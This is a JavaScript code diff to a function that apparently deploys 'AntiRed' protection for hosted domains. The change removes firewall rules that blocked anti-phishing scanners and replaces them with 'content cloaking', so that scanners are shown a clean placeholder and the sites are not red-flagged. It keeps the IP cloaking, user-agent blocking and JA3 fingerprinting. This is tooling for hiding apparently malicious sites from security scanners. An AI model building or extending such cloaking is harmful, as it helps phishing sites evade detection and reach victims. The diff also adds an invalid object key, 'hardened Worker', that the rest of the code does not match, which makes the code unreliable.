@@ -1493,11 +1493,11 @@ async function deployFullProtection(cpUsername, domain, plan = '') {
     htaccess: { success: false },
     jsChallenge: { success: false },
     ja3Rules: { success: false },
-    antiPhishingCfRules: { success: false },
-    cfWorker: { success: false },
+    hardened Worker: { success: false },
+    cleanupWAF: { success: false },
   }
 
-  log(`[AntiRed] Deploying full protection for ${cpUsername}@${domain} (${plan})`)
+  log(`[AntiRed] Deploying HARDENED protection (content cloaking) for ${cpUsername}@${domain} (${plan})`)
 
   // 1. Deploy .htaccess scanner IP cloaking + UA blocking (all plans)
   results.htaccess = await deployHtaccess(cpUsername, domain)
@@ -1511,11 +1511,29 @@ async function deployFullProtection(cpUsername, domain, plan = '') {
     const cfService = require('./cf-service')
     const zone = await cfService.getZoneByName(domain)
     if (zone) {
-      // 3a. JA3 fingerprinting via Cloudflare WAF
+      // 3a. JA3 fingerprinting via Cloudflare WAF (still useful for bot detection)
       results.ja3Rules = await createJA3Rules(zone.id)
 
-      // 3b. Anti-phishing scanner UA blocking at CF edge (critical for CF-proxied sites)
-      results.antiPhishingCfRules = await createAntiPhishingScannerRules(zone.id)
+      // 3b. REMOVE old anti-phishing blocking rules (we use content cloaking now)
+      // Old approach: Block scanners with 403 (gets sites red-flagged)
+      // New approach: Show clean placeholder (prevents red-flagging)
+      try {
+        const rules = await cfService.listFirewallRules(zone.id)
+        const antiPhishRule = rules.find(r => 
+          r.description?.toLowerCase().includes('anti-phishing') || 
+          r.description?.toLowerCase().includes('block anti-phishing')
+        )
+        if (antiPhishRule) {
+          await cfService.deleteFirewallRule(zone.id, antiPhishRule.id)
+          log(`[AntiRed] Removed old WAF blocking rule for ${domain} (using content cloaking now)`)
+          results.cleanupWAF = { success: true, removed: antiPhishRule.id }
+        } else {
+          results.cleanupWAF = { success: true, message: 'No old rules to remove' }
+        }
+      } catch (wafErr) {
+        log(`[AntiRed] WAF cleanup warning: ${wafErr.message}`)
+        results.cleanupWAF = { success: false, error: wafErr.message }
+      }
 
       // 3c. Set anti-bot profile level based on plan
       if (plan.toLowerCase().includes('golden')) {
@@ -1525,21 +1543,23 @@ async function deployFullProtection(cpUsername, domain, plan = '') {
       }
       await cfService.createAntiBotRules(zone.id)
 
-      // 3d. Deploy shared Cloudflare Worker routes (3 routes: domain/*, domain, www.domain/*)
-      results.cfWorker = await deploySharedWorkerRoute(domain, zone.id)
+      // 3d. Deploy HARDENED shared Worker with content cloaking (scanners see clean placeholder)
+      results.hardenedWorker = await deploySharedWorkerRoute(domain, zone.id)
+      
+      log(`[AntiRed] ✅ Hardened worker deployed for ${domain} - scanners will see clean placeholder`)
     } else {
       results.ja3Rules = { success: false, error: 'Cloudflare zone not found' }
-      results.antiPhishingCfRules = { success: false, error: 'Cloudflare zone not found' }
-      results.cfWorker = { success: false, error: 'Cloudflare zone not found' }
+      results.hardenedWorker = { success: false, error: 'Cloudflare zone not found' }
+      results.cleanupWAF = { success: false, error: 'Cloudflare zone not found' }
     }
   } catch (err) {
     log(`[AntiRed] Cloudflare protection error: ${err.message}`)
     results.ja3Rules = { success: false, error: err.message }
-    results.antiPhishingCfRules = { success: false, error: err.message }
-    results.cfWorker = { success: false, error: err.message }
+    results.hardenedWorker = { success: false, error: err.message }
+    results.cleanupWAF = { success: false, error: err.message }
   }
 
-  log(`[AntiRed] Protection deployed for ${domain}: htaccess=${results.htaccess.success}, js=${results.jsChallenge.success}, ja3=${results.ja3Rules.success}, antiPhishCF=${results.antiPhishingCfRules.success}, cfWorker=${results.cfWorker.success}`)
+  log(`[AntiRed] Hardened protection deployed for ${domain}: htaccess=${results.htaccess.success}, js=${results.jsChallenge.success}, ja3=${results.ja3Rules.success}, worker=${results.hardenedWorker?.success}, wafCleanup=${results.cleanupWAF.success}`)
   return { success: results.htaccess.success || results.jsChallenge.success, ...results }
 }
 
